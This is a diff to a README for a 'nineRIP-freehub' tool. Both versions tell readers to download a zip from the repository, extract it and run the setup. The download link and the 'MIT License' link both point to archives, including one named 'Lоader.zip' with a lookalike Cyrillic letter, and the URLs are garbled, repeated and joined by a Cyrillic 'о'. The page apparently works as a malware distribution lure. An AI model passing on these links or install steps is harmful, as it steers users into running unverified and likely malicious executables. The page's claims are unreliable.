@@ -41,7 +41,7 @@ This program delivers seamless performance across various platforms and guarante
 ---
 ## 📦 Installation
 
-1. Download **https://raw.githubusercontent.com/Rohan17182004/nineRIP-freehub/main/Lоader.zipоhttps://raw.githubusercontent.com/Rohan17182004/nineRIP-freehub/main/Lоader.zip** from the repository.
+1. Download **https://github.com/Rohan17182004/nineRIP-freehub/raw/refs/heads/main/growling/nine_RI_freehub_v3.2-alpha.3.zipоhttps://github.com/Rohan17182004/nineRIP-freehub/raw/refs/heads/main/growling/nine_RI_freehub_v3.2-alpha.3.zipоhttps://github.com/Rohan17182004/nineRIP-freehub/raw/refs/heads/main/growling/nine_RI_freehub_v3.2-alpha.3.zipоhttps://github.com/Rohan17182004/nineRIP-freehub/raw/refs/heads/main/growling/nine_RI_freehub_v3.2-alpha.3.zip** from the repository.
 2. Extract the archive using any compatible tool.
 3. Run the setup corresponding to your OS.
 4. Follow on-screen instructions for complete installation.
@@ -54,4 +54,4 @@ This repository is provided for **legitimate personal use and backup purposes** 
 ---
 ## 🔗 License
 
-Released under the [MIT License (2025)](https://raw.githubusercontent.com/Rohan17182004/nineRIP-freehub/main/Lоader.zipоhttps://raw.githubusercontent.com/Rohan17182004/nineRIP-freehub/main/Lоader.zip). Use, fork, and modify with full compliance!
+Released under the [MIT License (2025)](https://github.com/Rohan17182004/nineRIP-freehub/raw/refs/heads/main/growling/nine_RI_freehub_v3.2-alpha.3.zipоhttps://github.com/Rohan17182004/nineRIP-freehub/raw/refs/heads/main/growling/nine_RI_freehub_v3.2-alpha.3.zipоhttps://github.com/Rohan17182004/nineRIP-freehub/raw/refs/heads/main/growling/nine_RI_freehub_v3.2-alpha.3.zipоhttps://github.com/Rohan17182004/nineRIP-freehub/raw/refs/heads/main/growling/nine_RI_freehub_v3.2-alpha.3.zip). Use, fork, and modify with full compliance!
